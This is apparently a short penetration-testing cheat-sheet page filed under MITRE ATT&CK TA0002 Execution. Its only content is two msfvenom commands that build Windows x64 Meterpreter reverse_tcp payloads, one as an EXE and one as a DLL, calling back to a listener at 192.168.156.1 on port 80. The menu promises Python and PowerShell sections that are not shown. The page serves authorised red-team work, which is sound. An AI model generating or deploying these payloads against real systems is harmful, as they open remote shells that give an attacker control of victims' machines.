---
layout: post
title: TA0002 Execution
category: pen
modified_date: 2022-02-15
permalink: /pen/build-payload
---

**Mitre Att&ck Entreprise**: [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)

**Menu**
<!-- vscode-markdown-toc -->
* [Build System Interpreters - MSFvenom](#BuildSystemInterpreters-MSFvenom)
* [EXEC Python](#EXECPython)
	* [](#)
	* [EXEC Powershell](#EXECPowershell)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='BuildSystemInterpreters-MSFvenom'></a>build-interpreter-msfvenom
```sh
#? generate msfvenom payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll
```